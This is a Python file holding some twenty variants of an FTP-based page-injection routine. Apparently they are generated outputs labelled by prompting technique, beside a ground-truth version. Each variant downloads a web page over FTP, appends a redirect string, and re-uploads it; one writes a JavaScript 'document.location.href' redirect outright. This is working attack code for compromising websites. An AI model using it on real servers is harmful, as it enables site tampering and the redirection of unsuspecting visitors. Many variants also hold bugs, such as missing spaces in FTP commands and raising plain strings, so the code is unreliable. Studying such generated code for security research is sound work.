from ftplib import FTP
from ftplib import FTP_TLS
import ftplib
import logging
import os
import ssl

def ground_truth_code_injectPage(ftp, page, redirect):
    f = open(page + '.tmp', 'w')
    ftp.retrlines('RETR ' + page, f.write)
    f.write(redirect)
    f.close()
    with open(page + '.tmp', 'rb') as f:
        ftp.storlines('STOR ' + page, f)

def persona_injectPage(ftp, page, redirect):
    from ftplib import FTP
    ftp = FTP(ftp)
    with open(page + '.tmp', 'w') as f:
        ftp.retrlines('RETR'+ page, f.write)
    with open(page + '.tmp', 'a') as f:
        f.write(redirect)
    ftp.storlines('STOR'+ page, open(page + '.tmp', 'r'))
    import os
    os.remove(page + '.tmp')
    
def template_injectPage(ftp, page, redirect):
    try:
        with open(page + '.tmp', 'wb') as f:
            ftp.retrbinary('RETR'+ page, f.write)
        with open(page + '.tmp', 'ab') as f:
            f.write(redirect.encode())
        with open(page + '.tmp', 'rb') as f:
            ftp.storbinary('STOR'+ page, f)
        return True
    except Exception as e:
        raise(str(e))
        return False
    
def question_refinement_injectPage(server, port, username, password, file_path, redirect_url):
    from ftplib import FTP_TLS
    from tempfile import gettempdir
    import os
    ftps = FTP_TLS(host=server, port=port)
    ftps.login(user=username, passwd=password)
    ftps.prot_p()
    with open(os.path.join(gettempdir(), os.path.basename(file_path) + ".tmp"), 'wb') as f:
        ftps.retrbinary('RETR ' + file_path, f.write)
    with open(os.path.join(gettempdir(), os.path.basename(file_path) + ".tmp"), 'r') as f:
        file_content = f.read()
    sanitized_redirect = redirect_url.replace('<', '&lt;').replace('>', '&gt;')
    with open(os.path.join(gettempdir(), os.path.basename(file_path) + ".tmp"), 'w') as f:
        f.write("<script>document.location.href=\"" + sanitized_redirect + "\";</script>")
    ftps.storbinary('STOR ' + file_path, open(os.path.join(gettempdir(), os.path.basename(file_path) + ".tmp"), 'rb'))
    ftps.quit()
    os.remove(os.path.join(gettempdir(), os.path.basename(file_path) + ".tmp"))

    
def alternative_approaches_injectPage(ftp, page, redirect):
    try:
        with open(page + '.tmp', 'w') as temp_file:
            ftp.retrlines('RETR'+ page, temp_file.write)
            temp_file.write(redirect)
        with open(page + '.tmp', 'rb') as temp_file:
            ftp.storbinary('STOR'+ page, temp_file)
        import os
        os.remove(page + '.tmp')
    except Exception as e:
        print(f'An error occurred: {e}')
        try:
            import os
            os.remove(page + '.tmp')
        except Exception:
            pass
    finally:
        pass
    
def context_manager_injectPage(ftp, page, redirect):
	ftp.voidcmd('TYPE I')
	with open(page + '.tmp', 'wb') as f:
		ftp.retrbinary('RETR'+ page, f.write)
	with open(page + '.tmp', 'ab') as f:
		f.write(redirect.encode())
	ftp.storbinary('STOR'+ page, open(page + '.tmp', 'rb'))
	import os
	os.remove(page + '.tmp')
     
def flipped_interaction_3__injectPage(ftp, page, redirect):
    try:
        local_file = page + ".tmp"
        with open(local_file, "wb") as f:
            ftp.retrbinary("RETR " + page, f.write)
        with open(local_file, "a") as f:
            f.write(redirect)
        with open(local_file, "rb") as f:
            ftp.storbinary("STOR " + page, f)
    except ftp.error_perm as e:
        raise Exception(f"Failed to read or write file on FTP server: {e}")
    except Exception as e:
        raise Exception(f"An error occurred during FTP operation: {e}")
    
def flipped_interaction_4__injectPage(ftp, page, redirect):
    if not hasattr(ftp,'retrlines') or not hasattr(ftp,'storlines'):
        raise TypeError('Invalid FTP connection')
    temp_file = page + '.tmp'
    try:
        with open(temp_file, 'wb') as tmp:
            ftp.sendcmd('TYPE I')
            ftp.retrbinary('RETR'+ page, tmp.write)
        with open(temp_file, 'ab') as tmp:
            tmp.write(redirect.encode())
        with open(temp_file, 'rb') as tmp:
            ftp.sendcmd('TYPE I')
            ftp.storbinary('STOR'+ temp_file, tmp)
        import ftplib
        try:
            ftp.delete(page)
        except ftplib.all_errors as e:
            raise Exception('Failed to delete original file:'+ str(e))
        ftp.rename(temp_file, page)
    except Exception as e:
        raise Exception('Failed to inject redirect into page:'+ str(e))
    finally:
        import os
        try:
            os.remove(temp_file)
        except OSError:
            pass
        
def flipped_interaction_5__injectPage(ftp, page, redirect):
    with open(page + '.tmp', 'wb') as f:
        ftp.retrbinary('RETR'+ page, f.write)
        f.seek(0)
        content = f.read().decode('utf-8') + redirect
        f.seek(0)
        f.write(content.encode('utf-8'))
        f.truncate()
    with open(page + '.tmp', 'rb') as f:
        ftp.storbinary('STOR'+ page, f)
    import os
    os.remove(page + '.tmp')
    
def iterative_prompting_3__injectPage(ftp, page, redirect):
    if not isinstance(ftp, object) or not isinstance(page, str) or not isinstance(redirect, str):
        raise ValueError("Invalid input")
    try:
        with open(page + ".tmp", 'wb') as local_file:
            ftp.retrbinary(('RETR ' + page).encode('utf-8'), local_file.write)
        with open(page + ".tmp", 'ab+') as local_file:
            local_file.write(redirect.encode('utf-8'))
        with open(page + ".tmp", 'rb') as file:
            ftp.storbinary(('STOR ' + page).encode('utf-8'), file)
    except AttributeError as e:
        raise AttributeError("Invalid FTP object: '" + str(e) + "'")
    except ftplib.all_errors as e:
        raise Exception("FTP error: '" + str(e) + "'")
    except Exception as e:
        raise Exception("An error occurred: '" + str(e) + "'")

     
def iterative_prompting_4__injectPage(ftp, page, redirect):
    if not isinstance(ftp, ftplib.FTP):
        raise TypeError('Invalid FTP object')
    if not page or not isinstance(page, str):
        raise ValueError('Invalid page')
    if not redirect or not isinstance(redirect, str):
        raise ValueError('Invalid redirect')
    try:
        filename = page.split('/')[-1] + '.tmp'
        temp_file_path = os.path.join(os.getcwd(), filename)
        with open(temp_file_path, 'wb', buffering=0) as file:
            ftp.retrbinary('RETR '+ page, file.write)
        with open(temp_file_path, 'ab', buffering=0) as file:
            file.write(redirect.encode('utf-8', errors='replace'))
        with open(temp_file_path, 'rb', buffering=0) as file:
            ftp.storbinary('STOR '+ page, file)
        os.remove(temp_file_path)
    except ftplib.all_errors as e:
        raise Exception('FTP error:'+ str(e))
    except IOError as e:
        raise Exception('File IO error:'+ str(e))
    except Exception as e:
        raise Exception('Error:'+ str(e))
    
def iterative_prompting_5__injectPage(ftp, page, redirect):
    if ftp is None or not hasattr(ftp,'retrbinary') or not hasattr(ftp,'storbinary'):
        raise ValueError('Invalid FTP object')
    if not isinstance(page, str) or not page.strip():
        raise ValueError('Invalid page')
    if not isinstance(redirect, (str, bytes)) or not redirect.strip():
        raise ValueError('Invalid redirect')
    tmp_file_path = page + '.tmp'
    try: ftp.retrbinary('RETR'+ page, open(tmp_file_path, 'wb').write)
    except ftplib.all_errors as ex: raise IOError(f'Failed to retrieve file {page}: {str(ex)}')
    except Exception as ex: raise IOError(f'Failed to retrieve file {page}: {str(ex)}')
    contents = open(tmp_file_path, 'rb').read()
    if not contents or len(contents.strip()) == 0: raise IOError(f'Retrieved file {page} is empty')
    open(tmp_file_path, 'wb').write(contents + (redirect if isinstance(redirect, bytes) else redirect.encode('utf-8', errors='replace')))
    try: ftp.storbinary(f'STOR {page}', open(tmp_file_path, 'rb'))
    except ftplib.all_errors as ex: raise IOError(f'Failed to upload file {page}: {str(ex)}')
    except Exception as ex: raise IOError(f'Failed to upload file:{str(ex)}')
    import os
    try: os.remove(tmp_file_path)
    except OSError:
        pass
    
def few_shots_prompting_injectPage(ftp, page, redirect):
	filename = page + '.tmp'
	with open(filename, 'wb') as f:
		ftp.retrbinary('RETR'+ page, f.write)
	with open(filename, 'a') as f:
		f.write(redirect)
	ftp.storbinary('STOR'+ page, open(filename, 'rb'))
    
def cot_prompting_injectPage(ftp, page, redirect):
	ftp.retrbinary('RETR'+ page, open(page + '.tmp', 'wb').write)
	with open(page + '.tmp', 'a') as file:
		file.write(redirect)
	with open(page + '.tmp', 'rb') as file:
		ftp.storbinary('STOR'+ page, file)
        
def fact_check_list_injectPage(ftp, page, redirect):
    ftp.sendcmd('CWD /')
    with open(page + '.tmp', 'wb') as file:
        ftp.retrbinary('RETR'+ page, file.write)
    with open(page + '.tmp', 'rb') as file:
        contents = file.read()
    contents += bytes(redirect, 'utf-8')
    with open(page + '.tmp', 'wb') as file:
        file.write(contents)
    with open(page + '.tmp', 'rb') as file:
        ftp.storbinary('STOR'+ page, file)
    import os
    os.remove(page + '.tmp')
    
def not_interactive_mix_injectPage(ftp, page, redirect):
    try:
        with FTP() as ftp_connection:
            ftp_connection.connect(ftp['host'], ftp['port'])
            ftp_connection.login(ftp['user'], ftp['password'])
            with open(page + '.tmp', 'wb') as temp_file:
                ftp_connection.retrbinary('RETR'+ page, temp_file.write)
            with open(page + '.tmp', 'ab') as temp_file:
                temp_file.write(redirect.encode())
            with open(page + '.tmp', 'rb') as temp_file:
                ftp_connection.storbinary('STOR'+ page, temp_file)
    except Exception as e:
        print(f"Error occurred: {e}")
        
import logging
import os
from ftplib import error_perm, error_temp
def interactive_mix_injectPage(ftp, page, redirect):
    try:
        if not isinstance(ftp, FTP) or not hasattr(ftp, 'sendcmd'):
            raise ValueError("Invalid ftp object")
        if not isinstance(page, str) or not page.strip():
            raise ValueError("Invalid page parameter")
        if not isinstance(redirect, str) or not redirect.strip():
            raise ValueError("Invalid redirect parameter")
        filename, file_extension = os.path.splitext(page)
        tmp_file = f"{filename}.tmp"
        with open(tmp_file, 'wb') as tmp:
            try:
                ftp.retrbinary(f'RETR {page}', tmp.write)
            except error_perm as e:
                logging.error(f"Error retrieving file: {e}")
                raise
        with open(tmp_file, 'ab') as tmp:
            tmp.write(redirect.encode())
        try:
            ftp.storbinary(f'STOR {page}', open(tmp_file, 'rb'))
        except error_perm as e:
            logging.error(f"Error uploading file: {e}")
            raise
        os.remove(tmp_file)
    except (ValueError, IOError, OSError, error_perm, error_temp) as e:
        raise(f"An error occurred: {e}")


def baseline_injectPage(ftp, page, redirect):
    with open(page + '.tmp', 'wb') as f:
        ftp.retrbinary('RETR'+ page, f.write)
    with open(page + '.tmp', 'ab') as f:
        f.write(b'\n' + redirect.encode())
    with open(page + '.tmp', 'rb') as f:
        ftp.storbinary('STOR'+ page, f)
    import os
    os.remove(page + '.tmp')
